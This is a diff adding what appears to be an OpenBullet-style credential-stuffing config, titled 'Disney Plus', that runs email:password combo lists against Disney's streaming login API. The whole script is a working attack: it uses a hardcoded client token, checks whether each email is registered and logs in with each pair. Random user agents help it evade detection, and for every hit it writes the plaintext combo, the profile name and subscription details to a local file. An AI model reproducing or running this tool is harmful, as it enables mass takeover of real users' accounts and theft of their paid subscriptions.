@@ -1,0 +1,222 @@
+[SETTINGS]
+{
+  "Name": "Disney Plus",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-11-27T01:47:56.4013211-03:00",
+  "AdditionalInfo": "",
+  "Author": "EduAir",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GetRandomUA -> VAR "RANDOMAGENT" 
+
+FUNCTION Constant "0" -> VAR "latitude" 
+
+FUNCTION Constant "0" -> VAR "longitude" 
+
+FUNCTION Constant "windows" -> VAR "browser" 
+
+FUNCTION Constant "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84" -> VAR "clientToken" 
+
+FUNCTION Constant "disney-svod-3d9324fc" -> VAR "clientId" 
+
+!#CLIENT_API_KEY REQUEST GET "https://www.disneyplus.com/login" 
+!  
+!  HEADER "User-Agent: <RANDOMAGENT>" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#GET_TOKEN PARSE "<SOURCE>" LR "\"clientApiKey\":\"" "\"" -> VAR "clientToken" 
+
+!#GET_TOKEN PARSE "<SOURCE>" LR "clientId\":\"" "\"" -> VAR "clientId" 
+
+#BEAR_TOKEN REQUEST POST "https://global.edge.bamgrid.com/devices" 
+  CONTENT "{\"deviceFamily\":\"browser\",\"applicationRuntime\":\"chrome\",\"deviceProfile\":\"<browser>\",\"attributes\":{}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: <RANDOMAGENT>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-bamsdk-platform: <browser>" 
+  HEADER "x-bamsdk-client-id: <clientId>" 
+  HEADER "authorization: Bearer <clientToken>" 
+  HEADER "x-bamsdk-version: 4.2" 
+
+#BAD_LOCATION KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "403 ERROR" 
+
+#GET_BEAR PARSE "<SOURCE>" JSON "assertion" -> VAR "subjectToken" 
+
+#GET_ACCESS_TOKEN REQUEST POST "https://global.edge.bamgrid.com/token " EncodeContent=TRUE 
+  CONTENT "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=<latitude>&longitude=<longitude>&platform=browser&subject_token=<subjectToken>&subject_token_type=urn:bamtech:params:oauth:token-type:device" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: <RANDOMAGENT>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-bamsdk-platform: <browser>" 
+  HEADER "x-bamsdk-client-id: <clientId>" 
+  HEADER "authorization: Bearer <clientToken>" 
+  HEADER "x-bamsdk-version: 4.2" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "unauthorized_client" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+#CHECK_IF_MAIL_EXIST REQUEST POST "https://global.edge.bamgrid.com/idp/check" 
+  CONTENT "{\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: <RANDOMAGENT>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-bamsdk-platform: <browser>" 
+  HEADER "x-bamsdk-client-id: <clientId>" 
+  HEADER "authorization: Bearer <access_token>" 
+  HEADER "x-bamsdk-version: 4.2" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" EqualTo "{\"operations\":[\"Register\"]}" 
+  KEYCHAIN Success OR 
+    KEY "{\"operations\":[\"OTP\"]}" 
+
+#LOGIN REQUEST POST "https://global.edge.bamgrid.com/idp/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: <RANDOMAGENT>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-bamsdk-platform: <browser>" 
+  HEADER "x-bamsdk-client-id: <clientId>" 
+  HEADER "authorization: Bearer <access_token>" 
+  HEADER "x-bamsdk-version: 4.2" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Bad credentials" 
+  KEYCHAIN Success OR 
+    KEY "id_token" 
+
+#IDTOKEN PARSE "<SOURCE>" JSON "id_token" -> VAR "IDTOKEN" 
+
+#LOGIN REQUEST POST "https://global.edge.bamgrid.com/accounts/grant" 
+  CONTENT "{\"id_token\":\"<IDTOKEN>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: <RANDOMAGENT>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-bamsdk-platform: <browser>" 
+  HEADER "x-bamsdk-client-id: <clientId>" 
+  HEADER "authorization: Bearer <access_token>" 
+  HEADER "x-bamsdk-version: 4.2" 
+
+#NEWTOKEN PARSE "<SOURCE>" JSON "assertion" -> VAR "newToken" 
+
+#GET_ACCESS_TOKEN REQUEST POST "https://global.edge.bamgrid.com/token " EncodeContent=TRUE 
+  CONTENT "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token=<newToken>&subject_token_type=urn:bamtech:params:oauth:token-type:account" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: <RANDOMAGENT>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-bamsdk-platform: <browser>" 
+  HEADER "x-bamsdk-client-id: <clientId>" 
+  HEADER "authorization: Bearer <clientToken>" 
+  HEADER "x-bamsdk-version: 4.2" 
+
+#ACCESS_TOKEN PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+#LOGIN REQUEST GET "https://global.edge.bamgrid.com/accounts/me" 
+  
+  HEADER "User-Agent: <RANDOMAGENT>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-bamsdk-platform: <browser>" 
+  HEADER "x-bamsdk-client-id: <clientId>" 
+  HEADER "authorization: Bearer <access_token>" 
+  HEADER "x-bamsdk-version: 4.2" 
+
+#USERNAME PARSE "<SOURCE>" JSON "profileName" -> VAR "Username" 
+
+#SUBSCRIPTIONS REQUEST GET "https://global.edge.bamgrid.com/subscriptions" 
+  
+  HEADER "User-Agent: <RANDOMAGENT>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-bamsdk-platform: <browser>" 
+  HEADER "x-bamsdk-client-id: <clientId>" 
+  HEADER "authorization: Bearer <access_token>" 
+  HEADER "x-bamsdk-version: 4.2" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" EqualTo "[]" 
+
+PARSE "<SOURCE>" LR "\"sku\":" "\"partner\"" Recursive=TRUE -> VAR "NamePre" 
+
+PARSE "<NamePre[*]>" LR "\"name\":\"" "\"" Recursive=TRUE -> VAR "Name" "Subscription:  " "\\n" 
+
+PARSE "<SOURCE>" JSON "desc" Recursive=TRUE -> VAR "Description" "Description: " "\\n" 
+
+PARSE "<SOURCE>" JSON "nextRenewalDate" Recursive=TRUE -> VAR "Renovation Date" "Renovation Date: " "\\n" 
+
+PARSE "<SOURCE>" JSON "lastSyncDate" Recursive=TRUE -> VAR "Last Connection" "Last Connection: " "\\n" 
+
+UTILITY List "Name" Zip "Description" -> VAR "Subscriptions_1" 
+
+UTILITY List "Renovation Date" Zip "Last Connection" -> VAR "Subscriptions_3" 
+
+UTILITY List "Subscriptions_3" Zip "Subscriptions_1" -> VAR "toPrint" 
+
+UTILITY File "DisenyPlus.txt" Append "Combo : <USER>:<PASS>\\nDisplay Name: <Username>\\n<toPrint[*]>\\n=======================MADE BY EDUAIR============\\n\\n" -> VAR "Print" 
+
+PARSE "<SOURCE>" JSON "desc" Recursive=TRUE -> CAP "Description" 
+
+PARSE "<SOURCE>" JSON "nextRenewalDate" Recursive=TRUE -> CAP "Renovation Date" 
+
+PARSE "<SOURCE>" JSON "active" Recursive=TRUE -> CAP "Trial" 
+
+PARSE "<NamePre[*]>" LR "\"name\":\"" "\"" Recursive=TRUE -> CAP "Subscription" 
+
+PARSE "<SOURCE>" JSON "lastSyncDate" Recursive=TRUE -> CAP "Last Connection" 
+
